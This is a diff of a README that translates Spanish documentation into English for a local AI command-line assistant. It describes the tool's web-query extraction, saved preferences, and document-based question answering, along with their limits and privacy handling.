+## Web queries
 
-Una consulta web es un comando guardado de otro tipo: lee siempre la misma
-página y saca de ella unos datos concretos, en JSON. Sirve para lo que una
-página publica y no da ningún servicio en una línea: el último sorteo de la
-lotería, un tipo de cambio publicado, un horario.
+A web query is another kind of saved command: it always reads the same page
+and takes specific data from it, as JSON. It is for what a page publishes
+and no service gives in one line: the latest lottery draw, a published
+exchange rate, a schedule.
 
 ```
-Ariel > agrégame un comando para el último sorteo de la lotería de Nicaragua de internet
-ia > Busco en DuckDuckGo: Resultados sorteo lotería Nicaragua página oficial
-ia > ¿De cuál de estas páginas saco los datos?
+Ariel > add a command for the latest Nicaragua lottery draw from the internet
+ai > Searching DuckDuckGo: Nicaragua lottery draw results official page
+ai > Which of these pages should I take the data from?
 
   1. Resultados | Lotería Nacional
      https://loterianacional.com.ni/resultados/
   ...
 
 Ariel >
-ia > Esto es lo que saco ahora mismo de loterianacional.com.ni:
+ai > This is what I get right now from loterianacional.com.ni:
 
-  página:   https://loterianacional.com.ni/resultados/
-  rótulos:  sorteo="Sorteo" ganador="Ganador:" premio="Premio:" fecha="Fecha:" sucursal="Sucursal:"
+  page:     https://loterianacional.com.ni/resultados/
+  labels:   draw="Sorteo" winner="Ganador:" prize="Premio:" date="Fecha:" branch="Sucursal:"
 
   {
-    "sorteo": "2304",
-    "ganador": "12010",
-    "premio": "C$8,000,000",
-    "fecha": "10/11/2026",
-    "sucursal": "Tipitapa"
+    "draw": "2304",
+    "winner": "12010",
+    "prize": "C$8,000,000",
+    "date": "10/11/2026",
+    "branch": "Tipitapa"
   }
 
-ia > ¿Te vale así? ...
+ai > Is it OK like this? ...
 ```
 
-### Cómo funciona
+The labels are the page's own text, here in Spanish; the field names are
+yours.
 
-- **Los rótulos.** Cada dato se define por su rótulo, el texto fijo que en
-  la página va justo antes de él. Si la página dice «Ganador: 12010», el
-  campo `ganador` tiene el rótulo `Ganador:`. El programa busca el rótulo sin
-  mirar mayúsculas ni acentos y se queda con lo que le sigue en esa fila, o
-  con la fila siguiente si la del rótulo no trae nada más.
-- **Los bloques.** Si la página repite los datos (un bloque por sorteo), el
-  rótulo que sale primero marca dónde empieza cada bloque. Los demás datos se
-  buscan solo dentro de su bloque. Si al primer sorteo le falta un dato, sale
-  `null`; nunca se toma el del sorteo siguiente. Con `registros=N` se sacan
-  los N primeros bloques, en una lista.
-- **Páginas que son JSON.** Si la página es JSON, el rótulo es la clave
-  (`drawDate`) y el valor es lo que va entre comillas o la cifra. Un objeto
-  o una lista no cuentan como dato.
-- **El valor es el texto de la página, tal cual.** No se convierte nada: el
-  billete «09065» conserva su cero y el premio, su «C$».
+### How it works
 
-### Pidiéndola en la conversación
+- **The labels.** Each piece of data is defined by its label, the fixed text
+  that comes right before it on the page. If the page says "Ganador: 12010",
+  the `winner` field has the label `Ganador:`. The program looks for the
+  label ignoring case and accents and keeps what follows it on that row, or
+  the next row if the label's row has nothing else.
+- **The blocks.** If the page repeats the data (one block per draw), the
+  label that comes first marks where each block starts. The other data is
+  only looked for inside its block. If the first draw is missing a piece of
+  data, it comes out `null`; the next draw's is never taken. With
+  `records=N` the first N blocks are taken, as a list.
+- **Pages that are JSON.** If the page is JSON, the label is the key
+  (`drawDate`) and the value is what is between quotes, or the number. An
+  object or a list does not count as data.
+- **The value is the page's text, as is.** Nothing is converted: the ticket
+  "09065" keeps its zero and the prize, its "C$".
 
-Si la petición de un comando habla de internet, de una página, de una web,
-de DuckDuckGo o de curl, o trae una dirección `https://`, se guarda una
-consulta web en vez de un comando de PowerShell:
+### By asking in the conversation
 
-1. **La página.** Si traes la dirección, se usa esa. Si no, el modelo
-   escribe la búsqueda y se busca en DuckDuckGo. Eliges un resultado con su
-   número, pegas otra dirección o escribes otra búsqueda.
-2. **Los datos.** El modelo lee el principio de la página y propone los
-   rótulos. Cada rótulo tiene que estar en la página y dar un dato: si no,
-   se le dice qué falló y lo corrige (tres intentos). Los campos que no dan
-   nada se quitan, y se dice cuáles.
-3. **Lo ves antes de guardarla.** Sale el JSON con los datos leídos en ese
-   momento. Puedes pedir cambios («quita la sucursal», «dame los últimos 3»)
-   o escribir «otra» para elegir otra página.
-4. **Nombre, para qué sirve y una confirmación**, como con los comandos.
+If the request for a command mentions the internet, a page, a website,
+DuckDuckGo or curl, or contains an `https://` address, a web query is saved
+instead of a PowerShell command:
 
-Si un comando normal no sale («No encontré uno que valga»), escribir «web»
-busca el dato en internet.
+1. **The page.** If you give the address, that one is used. If not, the
+   model writes the search and DuckDuckGo is searched. You pick a result by
+   its number, paste another address or type another search.
+2. **The data.** The model reads the beginning of the page and proposes the
+   labels. Each label has to be on the page and give a piece of data: if
+   not, it is told what failed and fixes it (three attempts). Fields that
+   give nothing are removed, and it says which.
+3. **You see it before it is saved.** The JSON with the data read at that
+   moment is shown. You can ask for changes ("remove the branch", "give me
+   the last 3") or type "another" to choose another page.
+4. **Name, what it is for and one confirmation**, as with commands.
 
-### De una vez, con `/comando web`
+If a normal command does not come out ("I didn't find one that works"),
+typing "web" looks for the data on the internet.
 
-```
-/comando web loteria-nicaragua https://loterianacional.com.ni/resultados/ sorteo=Sorteo ganador="Ganador:" premio="Premio:" fecha="Fecha:"
-```
-
-Los rótulos con espacios van entre comillas, y `registros=5` saca cinco
-bloques. Se lee la página y se enseña lo que sale antes de preguntar si se
-guarda.
-
-### Al usarla
-
-Igual que un comando guardado:
-
-- se lista con `/comando`;
-- `/comando loteria-nicaragua` enseña el JSON sin pasar por el modelo;
-- preguntar con las palabras del nombre («¿cuál fue el último sorteo de la
-  lotería de Nicaragua?») la ejecuta antes de preguntar al modelo;
-- el modelo también puede pedirla por su nombre.
-
-El modelo recibe el JSON rotulado con la página de la que sale. Si le pides
-JSON, lo copia tal cual. Si no, lo cuenta en frases sin cambiar cifras,
-nombres ni fechas.
-
-### Límites
-
-- **La página tiene que traer los datos en su HTML.** Las que los pintan con
-  JavaScript al abrirse llegan casi vacías, y se avisa.
-- **Si la página cambia sus rótulos, la consulta deja de dar datos** y lo
-  dice; no se inventan. Se arregla guardándola de nuevo.
-- **El modelo ve solo el principio de la página** (3500 caracteres) para
-  proponer los rótulos. Si los datos están más abajo, escríbelos tú con
-  `/comando web`.
-- **Mira la lista de resultados antes de elegir.** La búsqueda puede traer
-  páginas de otro país o de otra lotería. Con la frase «...en json», Gemma 4
-  E4B buscó «API lotería Nicaragua JSON» y el primer resultado era una API de
-  la lotería de España. Ahora la búsqueda no lleva el formato, y lo que se
-  saca se enseña antes de guardar.
-- **Las mismas reglas de dirección que los comandos:** solo `https`, servidor
-  público y cada redirección revisada. Hasta 8 campos y 10 bloques. Las
-  consultas cuentan dentro de los 20 comandos guardados.
-
-## Preferencias
-
-Lo que quieres que se tenga en cuenta siempre, también en las próximas
-conversaciones:
+### In one go, with `/command web`
 
 ```
-Ariel > recuerda que las cifras de dinero me las des en dólares
-  preferencia: Las cifras de dinero me las des en dólares
-  ¿La guardo para esta y las próximas conversaciones? (s/n) s
-guardada. La tendré en cuenta en esta y en las próximas conversaciones
+/command web nicaragua-lottery https://loterianacional.com.ni/resultados/ draw=Sorteo winner="Ganador:" prize="Premio:" date="Fecha:"
 ```
 
-- **Cómo se guardan:**
-  - empezando el mensaje con «recuerda que», «recuérdame que», «ten en cuenta
-    que», «toma nota:», «guarda en mis preferencias:», «de ahora en
-    adelante» o «a partir de ahora»;
-  - o con `/preferencia agregar <texto>`.
-- **Siempre se pregunta antes de guardar.** El mensaje se reconoce por cómo
-  empieza, y eso puede equivocarse. Si contestas que no, el mensaje va al
-  modelo como cualquier otro.
-- **Solo las escribes tú.** El modelo no tiene herramienta para guardarlas,
-  así que una página que lea en una búsqueda no puede colarle una
-  «preferencia». Si le pides que recuerde algo de otra forma («para que lo
-  recuerdes la próxima vez»), contesta que no puede y te dice cómo hacerlo.
-  Antes contestaba «lo recordaré», y era falso.
-- **Cómo las usa el modelo:** van en cada pregunta, al final de la
-  instrucción de sistema. Después de una búsqueda en internet se repiten
-  junto a los resultados, porque es lo que el modelo lee al redactar.
-- **Monedas:** con «cifras en dólares» guardado y una página en córdobas, se
-  le pide que busque el tipo de cambio y dé las dos cifras, y que nunca
-  convierta con un cambio de memoria. Gemma 4 E4B no siempre lo hace. A veces
-  da la cifra de la fuente y ofrece convertirla, pero no inventa el cambio.
-- **Comandos:** `/preferencias` las lista, numeradas, y `/preferencia quitar
-  <número>` borra una.
-- **Límites:** hasta 12 preferencias de hasta 200 caracteres, guardadas en
-  `%LOCALAPPDATA%\PRC-CMD-AI\preferencias.json`. El servidor local tiene 4096
-  tokens de contexto y las preferencias viajan en cada petición. Si el
-  fichero se rompe, se avisa y no se sobrescribe.
+Labels with spaces go in quotes, and `records=5` takes five blocks. The page
+is read and what comes out is shown before asking whether to save it.
 
-## Documentos
+### Using it
 
-Una carpeta con los documentos de tu negocio (servicios, precios, empleados,
-horarios, procedimientos, políticas internas...) y la terminal contesta con
-lo que dicen. Para quien lo vaya a usar en su negocio sin conocimientos
-técnicos está la [guía de uso de los documentos](docs/guia-documentos.md):
-cómo preparar la carpeta, qué PDF sirven, cómo preguntar, comprobar y
-olvidar. El ejemplo de aquí es una ferretería inventada, la misma de las
-pruebas:
+Just like a saved command:
+
+- it is listed with `/command`;
+- `/command nicaragua-lottery` shows the JSON without going through the
+  model;
+- asking with the words of the name ("what was the latest Nicaragua lottery
+  draw?") runs it before asking the model;
+- the model can also ask for it by name.
+
+The model receives the JSON labeled with the page it comes from. If you ask
+it for JSON, it copies it as is. If not, it tells it in sentences without
+changing figures, names or dates.
+
+### Limits
+
+- **The page has to have the data in its HTML.** Pages that draw it with
+  JavaScript when they open arrive almost empty, and it warns you.
+- **If the page changes its labels, the query stops giving data** and says
+  so; nothing is made up. It is fixed by saving it again.
+- **The model only sees the beginning of the page** (3500 characters) to
+  propose the labels. If the data is further down, write them yourself with
+  `/command web`.
+- **Look at the list of results before choosing.** The search can bring
+  pages from another country or another lottery. With the sentence "...as
+  json", Gemma 4 E4B searched "API lotería Nicaragua JSON" and the first
+  result was an API for Spain's lottery. Now the search does not include the
+  format, and what is taken is shown before saving.
+- **The same address rules as commands:** only `https`, a public server and
+  every redirect checked. Up to 8 fields and 10 blocks. Queries count
+  toward the 20 saved commands.
+
+## Preferences
+
+What you want taken into account always, also in future conversations:
 
 ```
-Ariel > aprende de los documentos de D:\MiNegocio
-ia > Voy a leer los documentos de D:\MiNegocio para contestarte con lo que dicen. No los
-     cambio ni los mando a ningún sitio: lo que lea se queda en este equipo.
-ia > Hay 12 que sé leer (2 Word, 2 texto, 2 OpenDocument, 1 Excel, 1 CSV, ...).
-ia > ¿De qué tratan, en pocas palabras? Así sé cuándo mirarlos; ...
-Ariel > mi ferretería: horarios, empleados, precios, políticas y procedimientos
-ia > Listo: leí 10 documentos (16 fragmentos) en 0.5 s. Pregúntame lo que quieras sobre ...
-Ariel > ¿cuánto cuesta el corte de llaves y desde cuándo?
-consultando tus documentos: precios.xlsx
-ia > El corte de llaves cuesta 50 y está disponible desde el 10/11/2025. Este dato proviene
-     de precios.xlsx (apartado «Hoja: Servicios»).
-Ariel > ¿cuánto gana Luis Mora?
-ia > El documento empleados.csv indica que Luis Mora tiene el cargo de Cajero y su turno es
-     Tarde, pero no especifica su salario.
+Ariel > remember to give me money figures in dollars
+  preference: Give me money figures in dollars
+  Shall I save it for this and future conversations? (y/n) y
+saved. I will keep it in mind in this and future conversations (/preferences lists them).
 ```
 
-### Cómo funciona
+- **How they are saved:**
+  - by starting the message with "remember that", "remember to", "keep in
+    mind that", "bear in mind that", "take note:", "save to my
+    preferences:", "from now on", "starting now" or "going forward" (or
+    with "always answer...", which is kept whole); the Spanish openings
+    ("recuerda que", "ten en cuenta que", "de ahora en adelante"...) work
+    too;
+  - or with `/preference add <text>`.
+- **It always asks before saving.** The message is recognized by how it
+  starts, and that can be wrong. If you answer no, the message goes to the
+  model like any other.
+- **Only you write them.** The model has no tool to save them, so a page it
+  reads in a search cannot slip a "preference" into it. If you ask it to
+  remember something another way ("so you remember it next time"), it
+  answers that it cannot and tells you how to do it. It used to answer "I'll
+  remember it", and that was false.
+- **How the model uses them:** they go with every question, at the end of
+  the system instruction. After an internet search they are repeated next
+  to the results, because that is what the model reads when writing.
+- **Currencies:** with "figures in dollars" saved and a page in córdobas, it
+  is asked to look up the exchange rate and give both figures, and never to
+  convert with a rate from memory. Gemma 4 E4B does not always do it.
+  Sometimes it gives the source's figure and offers to convert it, but it
+  does not make up the rate.
+- **Commands:** `/preferences` lists them, numbered, and `/preference remove
+  <number>` deletes one.
+- **Limits:** up to 12 preferences of up to 200 characters, saved in
+  `%LOCALAPPDATA%\PRC-CMD-AI\preferencias.json`. The local server has a
+  4096-token context and the preferences travel with every request. If the
+  file gets corrupted, it warns you and does not overwrite it.
 
-- **No se entrena el modelo.** En un equipo modesto no se puede, y un modelo
-  «entrenado» con unos documentos los mezcla y rellena los huecos
-  inventando. Lo que se hace es buscar, en cada pregunta, los fragmentos que
-  vienen al caso. Esos fragmentos viajan con la pregunta, cada uno con el
-  nombre de su fichero, y se le pide al modelo que conteste con ellos y diga
-  de qué documento sale el dato. Si no lo dicen, dice que no viene en los
-  documentos.
-- **La búsqueda es por palabras**, sin acentos, sin plurales ni género y con
-  formas verbales recortadas («venden» encuentra «vendemos»). Tiene unos
-  pocos sinónimos de lo que se pregunta en un negocio: horario/abren/
-  atención, empleado/personal, precio/costo/tarifa... Esas palabras de
-  categoría pesan menos que las demás: en «¿cuánto cuesta el horno?» manda
-  «horno», no «cuesta». Funciona sin dependencias, sin tocar llama-server y
-  en milisegundos.
-- **Cuándo viajan:** solo si la pregunta tiene que ver con los documentos,
-  es decir, si el mejor fragmento trae palabras de la pregunta que no salen
-  en todas partes. «¿Cuál es la capital de Francia?» o «¿qué hora es?» se
-  contestan como siempre. Si no viajan solos, el modelo puede pedirlos con la
-  herramienta `consultar_documentos` («¿tienen sucursal en León?»).
-- **Antes de contestar dice qué consulta** (`consultando tus documentos:
-  precios.xlsx`) y, al terminar, de qué documentos salió.
-- **Las tablas se leen fila a fila.** Si la primera fila es una cabecera
-  segura, cada fila lleva sus rótulos («Nombre: Ana Pérez | Cargo:
-  Gerente»). Es segura cuando es todo texto y alguna columna trae cifras
-  debajo. Si no, va aparte como «Columnas (primera fila)». Una tabla de dos
-  columnas «Gerente | Ana» no se toma por cabecera: emparejar mal un rótulo
-  con un dato sería dar un dato falso.
-- **En Excel, las fechas y horas salen como fechas y horas.** Excel las
-  guarda como números (45971 es el 10/11/2025; 0,3125 son las 07:30), y se
-  convierten según el formato de la celda.
+## Documents
 
-### Qué sabe leer
+A folder with your business's documents (services, prices, staff, opening
+hours, procedures, internal policies...) and the terminal answers with what
+they say. For people who will use it in their business without technical
+knowledge there is the [documents usage guide](docs/documents-guide.md): how to prepare the folder, which PDFs
+work, how to ask, check and forget. The example here is an invented hardware
+store, the one used in the tests (there its documents are in Spanish;
+`tests/negocio.ps1 -Idioma en` creates an English business, a coffee shop):
 
-| Formato | Ficheros |
+```
+Ariel > learn from the documents in D:\MyBusiness
+ai > I'm going to read the documents in D:\MyBusiness to answer you with what they say. I don't
+     change them or send them anywhere: what I read stays on this computer.
+ai > There are 12 I can read (2 Word, 2 text, 2 OpenDocument, 1 Excel, 1 CSV, ...).
+ai > What are they about, in a few words? That way I know when to look at them; ...
+Ariel > my hardware store: hours, staff, prices, policies and procedures
+ai > Done: I read 10 documents (16 passages) in 0.5 s. Ask me anything about ...
+Ariel > how much is key cutting and since when?
+checking your documents: prices.xlsx
+ai > Key cutting costs 50 and has been available since November 10, 2025. This comes
+     from prices.xlsx (section "Sheet: Services").
+Ariel > how much does Luis Mora make?
+ai > The document employees.csv says Luis Mora is a Cashier on the Afternoon shift, but
+     it does not give his salary.
+```
+
+### How it works
+
+- **The model is not trained.** On a modest computer it can't be done, and a
+  model "trained" on some documents mixes them up and fills in the gaps by
+  making things up. What happens instead is that, for each question, the
+  passages that are relevant are looked up. Those passages travel with the
+  question, each with the name of its file, and the model is asked to answer
+  with them and say which document the fact comes from. If they don't say
+  it, it says it is not in the documents.
+- **The search is by words**, without accents, without plurals or gender and
+  with verb forms trimmed ("venden" finds "vendemos"). It has a few synonyms
+  for what people ask a business: hours/open/opening, employee/staff,
+  price/cost/fee... Those category words weigh less than the others: in "how
+  much does the oven cost?" it is "oven" that matters, not "cost". It does
+  the same in English (stop words, plurals, -ing and -ed forms), and each
+  group of synonyms also has its Spanish words: a question in one language
+  finds a document in the other ("price" finds "precio"). It works without
+  dependencies, without touching llama-server and in milliseconds.
+- **When they travel:** only if the question has to do with the documents,
+  that is, if the best passage has words from the question that do not
+  appear everywhere. "What is the capital of France?" or "what time is it?"
+  are answered as usual. If they don't travel on their own, the model can
+  ask for them with the `consultar_documentos` tool ("do you have a branch
+  in León?").
+- **Before answering it says what it is checking** (`checking your
+  documents: prices.xlsx`) and, at the end, which documents the answer came
+  from.
+- **Tables are read row by row.** If the first row is a safe header, each
+  row carries its labels ("Name: Ana Pérez | Position: Manager"). It is safe
+  when it is all text and some column has numbers below. If not, it goes
+  separately as "Columns (first row)". A two-column table "Manager | Ana" is
+  not taken as a header: pairing a label with the wrong data would be giving
+  false data.
+- **In Excel, dates and times come out as dates and times.** Excel stores
+  them as numbers (45971 is November 10, 2025; 0.3125 is 07:30), and they are
+  converted according to the cell's format. With the messages in English
+  they come out as in an English Excel: 11/10/2025, 7:30 AM and currency
+  cells with their symbol ("$4.95").
+
+### What it can read
+
+| Format | Files |
 | --- | --- |
-| Word | `.docx` y `.docm` (títulos, listas y tablas; sin el texto borrado con control de cambios) |
-| Excel | `.xlsx` y `.xlsm` (cada hoja con su nombre) |
-| PowerPoint | `.pptx` y `.pptm` (cada diapositiva, en orden) |
-| PDF | `.pdf` con texto (títulos por el tamaño de la letra, tablas en columnas; ver abajo) |
+| Word | `.docx` and `.docm` (headings, lists and tables; without text deleted with track changes) |
+| Excel | `.xlsx` and `.xlsm` (each sheet with its name) |
+| PowerPoint | `.pptx` and `.pptm` (each slide, in order) |
+| PDF | `.pdf` with text (headings by font size, tables in columns; see below) |
 | OpenDocument | `.odt`, `.ods`, `.odp` |
-| Texto | `.txt`, `.md`, `.markdown`, `.csv`, `.tsv`, `.json`, `.xml`, `.html`, `.htm`, `.rtf`, `.log`, `.ini`, `.yml`, `.yaml` |
+| Text | `.txt`, `.md`, `.markdown`, `.csv`, `.tsv`, `.json`, `.xml`, `.html`, `.htm`, `.rtf`, `.log`, `.ini`, `.yml`, `.yaml` |
 
-Los ficheros de texto se leen en UTF-8 o en Windows-1252, que es como
-guardaban el Bloc de notas antiguo y el Excel en español. Los formatos
-viejos de Office (`.doc`, `.xls`, `.ppt`) no se leen: se dice cuáles son y
-que hay que guardarlos en el formato nuevo. Las imágenes y demás ficheros se
-ignoran, igual que los ocultos, los temporales de Office (`~$...`) y las
-carpetas que empiezan por punto.
+Text files are read as UTF-8 or Windows-1252, which is how old Notepad and
+Spanish Excel used to save them. Old Office formats (`.doc`, `.xls`, `.ppt`)
+are not read: it says which ones they are and that they have to be saved in
+the new format. Images and other files are ignored, as are hidden files,
+Office temp files (`~$...`) and folders that start with a dot.
 
-**Los PDF** se leen con `lib/pdf.ps1`, sin bibliotecas. Un PDF no guarda
-texto, sino qué letra se dibuja, dónde y con qué tipo de letra. Se recorren
-las páginas en orden y se descifra cada letra con su tipo de letra: primero
-con su tabla ToUnicode y, si no la trae, con su codificación y sus nombres de
-letra. Por la posición se decide si va un espacio, un salto de línea, un
-párrafo o una columna de tabla (` | `). Una línea en letra claramente más
-grande que el cuerpo (o corta y toda en negrita) sale como título (`# ...`),
-igual que con Word, así que los fragmentos llevan su apartado. Está probado
-con PDF de verdad de Edge y de «Microsoft Print to PDF», y con PDF de
-prueba con lo que hacen Word y Chrome: comprimidos, con objetos dentro de
-streams y con tipos de letra recortados. Con un PDF hecho por Word no se ha
-probado, porque no estaba instalado. Lo que no lee lo dice, con el motivo:
+**PDFs** are read with `lib/pdf.ps1`, without libraries. A PDF does not store
+text, but which letter is drawn, where and with which font. The pages are
+gone through in order and each letter is decoded with its font: first with
+its ToUnicode table and, if it has none, with its encoding and its glyph
+names. From the position it decides whether there is a space, a line break,
+a paragraph or a table column (` | `). A line in a font clearly larger than
+the body (or short and all in bold) comes out as a heading (`# ...`), the
+same as with Word, so the passages carry their section. It has been tested
+with real PDFs from Edge and from "Microsoft Print to PDF", and with test
+PDFs built the way Word and Chrome build them: compressed, with objects
+inside streams and with subset fonts. It has not been tested with a PDF made
+by Word, because Word was not installed. What it does not read, it says,
+with the reason:
 
-- **Escaneados:** son una imagen y no tienen texto, salvo que traigan la capa
-  de un OCR, que sí se lee.
-- **Protegidos** con contraseña o contra copia: se propone imprimirlos en
-  «Microsoft Print to PDF» para sacar una copia sin protección.
-- **Tipos de letra que no se pueden descifrar:** un tipo de letra recortado
-  sin tabla ToUnicode da letras cambiadas, y un precio con las letras
-  cambiadas es un dato falso. Se cuentan las letras sin descifrar y se mira
-  si el texto parece texto: con más de un 5 % de letras sin descifrar, o con
-  palabras sin vocales y signos sueltos, ese PDF no se lee.
+- **Scanned:** they are an image and have no text, unless they carry an OCR
+  layer, which is read.
+- **Protected** with a password or against copying: it suggests printing
+  them to "Microsoft Print to PDF" to get an unprotected copy.
+- **Fonts that can't be decoded:** a subset font without a ToUnicode table
+  gives scrambled letters, and a price with scrambled letters is false data.
+  The undecoded letters are counted and it checks whether the text looks
+  like text: with more than 5 % undecoded letters, or with words without
+  vowels and stray symbols, that PDF is not read.
 
-### Órdenes
+### Commands
 
-- `aprende de los documentos de D:\MiNegocio`, `lee la carpeta "D:\Mis
-  documentos\Empresa"` o `/documentos agregar <carpeta>`: agrega una
-  carpeta, con sus subcarpetas. Pregunta de qué trata, porque eso le dice al
-  modelo cuándo mirarla.
-- `/documentos`: las carpetas, cuánto se leyó de cada una y lo que no se
-  pudo leer, con el motivo.
-- `/documentos buscar <texto>`: los fragmentos que saldrían para ese texto,
-  sin preguntar al modelo. Sirve para ver por qué contesta lo que contesta.
-- `/documentos actualizar`: vuelve a revisar las carpetas ahora. No suele
-  hacer falta: se revisan solas cada cinco minutos, y solo se lee lo que
-  cambió.
-- `/documentos quitar <nombre>`: deja de leer una carpeta. El nombre es el
-  corto que enseña `/documentos` (el de la carpeta en minúsculas, sin
-  acentos y con guiones: `D:\Mi Negocio` es `mi-negocio`). Sus ficheros
-  siguen donde estaban.
-- `/documentos olvidar <documento, apartado, tema o todo>`,
-  `/documentos olvidos` y `/documentos recordar <número>`: ver «Olvidar».
-- `/documentos on|off`: usarlos o no en esta sesión. También se apagan con
-  `-NoDocumentos` o con `"documentos": false` en `settings.json`.
+- `learn from the documents in D:\MyBusiness`, `read the folder "D:\My
+  documents\Company"` or `/documents add <folder>`: adds a folder, with its
+  subfolders. It asks what it is about, because that tells the model when
+  to look at it.
+- `/documents`: the folders, how much was read from each one and what could
+  not be read, with the reason.
+- `/documents search <text>`: the passages that would come up for that
+  text, without asking the model. It is for seeing why it answers what it
+  answers.
+- `/documents update`: checks the folders again now. It is not usually
+  needed: they are checked on their own every five minutes, and only what
+  changed is read.
+- `/documents remove <name>`: stops reading a folder. The name is the short
+  one shown by `/documents` (the folder's name in lowercase, without accents
+  and with dashes: `D:\My Business` is `my-business`). Its files stay where
+  they were.
+- `/documents forget <document, section, topic or everything>`,
+  `/documents forgotten` and `/documents restore <number>`: see
+  "Forgetting".
+- `/documents on|off`: use them or not in this session. They are also
+  turned off with `-NoDocuments` or with `"documentos": false` in
+  `settings.json`.
 
-### Olvidar
+### Forgetting
 
-Se puede olvidar todo o solo una parte. Lo que se olvida es lo leído; tus
-ficheros no se tocan:
+You can forget everything or just a part. What is forgotten is what was
+read; your files are not touched:
 
 ```
-Ariel > olvida lo de la extensión
-ia > Voy a olvidar lo que hable de «extension» (6 líneas de Empleados.csv). Tus ficheros no se tocan.
-  por ejemplo:
-  - Empleados.csv: Extensión: 101
-  - Empleados.csv: Extensión: 102
+Ariel > forget about the extension
+ai > I'm going to forget what mentions "extension" (6 lines of Employees.csv). Your files are not touched.
+  for example:
+  - Employees.csv: Extension: 101
+  - Employees.csv: Extension: 102
   ...
-ia > ¿Lo olvido? («sí» o «no»)
-Ariel > sí
-ia > Olvidado. Si te arrepientes: /documentos olvidos y /documentos recordar <número>.
+ai > Shall I forget it? ("yes" or "no")
+Ariel > yes
+ai > Forgotten. If you change your mind: /documents forgotten and /documents restore <number>.
 ```
 
-- **Qué se puede olvidar:**
-  - **Todo:** «olvida todo lo que aprendiste» o `/documentos olvidar todo`.
-    Quita las carpetas y lo que se guardó de ellas.
-  - **Una carpeta:** «deja de usar la carpeta negocio».
-  - **Un documento:** «olvida el documento Empleados.csv». Ya ni se lee, y
-    lo leído de él se borra.
-  - **Un apartado de un documento:** «olvida el apartado Permisos». Se va
-    con todo lo que cuelga de él, y el resto del documento sigue.
-  - **Un tema en todos los documentos:** «olvida lo de los sueldos». Se
-    quitan solo las líneas que hablan de él. En una fila de tabla se quita
-    solo ese dato («Sueldo: 25000»), salvo que sea el primero de la fila, el
-    que dice de qué es la fila; entonces se va la fila entera, para no dejar
-    un precio sin su producto.
-- **Por qué orden se busca:** primero el nombre exacto de una carpeta, un
-  documento o un apartado; después parte del nombre; si no, es un tema. Así
-  «permisos» es el apartado Permisos y no el documento «Vacaciones y
-  permisos».
-- **Siempre enseña qué va a olvidar,** con ejemplos, y pide un sí.
-- **Se puede deshacer** lo olvidado de un documento, un apartado o un tema:
-  `/documentos olvidos` lo lista y `/documentos recordar <número>` lo vuelve
-  a usar. Se guarda en `documentos-olvidos.json`. Olvidar una carpeta o todo
-  no se deshace así, porque quita la carpeta de la lista (y con «todo»,
-  también la lista de olvidos): se vuelve a leer con `/documentos agregar`.
-- **Lo que ya se dijo en la conversación** sigue en su memoria; `/new` la
-  vacía.
+- **What can be forgotten:**
+  - **Everything:** "forget everything you learned" or
+    `/documents forget everything`. It removes the folders and what was
+    saved from them.
+  - **A folder:** "stop using the folder business".
+  - **A document:** "forget the document Employees.csv". It is no longer
+    read, and what was read from it is deleted.
+  - **A section of a document:** "forget the section Permissions". It goes
+    with everything under it, and the rest of the document stays.
+  - **A topic in all the documents:** "forget about the salaries". Only the
+    lines that talk about it are removed. In a table row only that piece of
+    data is removed ("Salary: 25000"), unless it is the first one in the
+    row, the one that says what the row is about; then the whole row goes,
+    so as not to leave a price without its product.
+- **In what order it searches:** first the exact name of a folder, a
+  document or a section; then part of the name; if not, it is a topic. That
+  way "permissions" is the section Permissions and not the document
+  "Vacations and permissions".
+- **It always shows what it is going to forget,** with examples, and asks
+  for a yes.
+- **It can be undone** for what was forgotten from a document, a section or
+  a topic: `/documents forgotten` lists it and `/documents restore <number>`
+  uses it again. It is kept in `documentos-olvidos.json`. Forgetting a
+  folder or everything is not undone this way, because it removes the folder
+  from the list (and with "everything", also the list of forgotten items):
+  it is read again with `/documents add`.
+- **What was already said in the conversation** stays in its memory; `/new`
+  clears it.
 
-### Privacidad
+### Privacy
 
-Los documentos nunca se modifican. Lo leído se guarda en
-`%LOCALAPPDATA%\PRC-CMD-AI\documentos\`, para no releer cada vez lo que no
-cambió; la lista de carpetas va en `documentos.json` y lo olvidado en
-`documentos-olvidos.json`, en la misma carpeta `PRC-CMD-AI`. Los fragmentos
-solo se mandan a los proveedores locales (Gemma, Qwen, Ollama). Con un proveedor de internet (xAI, OpenAI) saldrían del equipo, así
-que no se mandan y se avisa una vez. Para permitirlo en una sesión está
-`/documentos nube on`, y para siempre, `"documentos_nube": true` en
+The documents are never modified. What was read is saved in
+`%LOCALAPPDATA%\PRC-CMD-AI\documentos\`, so as not to reread each time what
+did not change; the list of folders goes in `documentos.json` and what was
+forgotten in `documentos-olvidos.json`, in the same `PRC-CMD-AI` folder. The
+passages are only sent to the local providers (Gemma, Qwen, Ollama). With an
+internet provider (xAI, OpenAI) they would leave the computer, so they are
+not sent and it warns you once. To allow it in one session there is
+`/documents cloud on`, and for good, `"documentos_nube": true` in
 `settings.json`.
 
-### Límites
+### Limits
 
-- **Velocidad:** 400 documentos (2,4 MB de texto) se leen la primera vez en
-  unos 5 s. Al volver a arrancar, el índice guardado se carga en menos de
-  medio segundo. Cada pregunta busca en unos 0,2 s. Los PDF van más
-  despacio, porque PowerShell recorre letra a letra: unas 15 páginas de
-  Chrome (que coloca cada letra por separado, el peor caso) en 3 s. Solo la
-  primera vez: lo leído se guarda y no se relee mientras no cambie.
-- **Topes:** 10 carpetas, 3000 ficheros, 30 MB por fichero y 1,5 millones
-  de caracteres de texto por fichero. Viajan 4 fragmentos de 700 caracteres
-  como mucho por pregunta, porque el servidor local tiene 4096 tokens de
-  contexto.
-- **Busca palabras, no ideas.** Una pregunta sin ninguna palabra de los
-  documentos («¿de qué color es la ropa de trabajo?» cuando el documento
-  dice «uniforme») puede no encontrarlos. El modelo aún puede pedirlos con
-  la herramienta, o puedes probar con `/documentos buscar`.
-- **Una respuesta solo es tan buena como los fragmentos.** Si dos documentos
-  se contradicen, el modelo ve los dos. Con «¿a qué hora abren los
-  sábados?», Gemma 4 E4B dio la hora de la bodega, que estaba en otra hoja
-  del Excel.
+- **Speed:** 400 documents (2.4 MB of text) are read the first time in about
+  5 s. When starting again, the saved index loads in less than half a
+  second. Each question searches in about 0.2 s. PDFs go slower, because
+  PowerShell goes letter by letter: about 15 pages from Chrome (which places
+  each letter separately, the worst case) in 3 s. Only the first time: what
+  was read is saved and not reread as long as it does not change.
+- **Caps:** 10 folders, 3000 files, 30 MB per file and 1.5 million
+  characters of text per file. At most 4 passages of 700 characters travel
+  per question, because the local server has a 4096-token context.
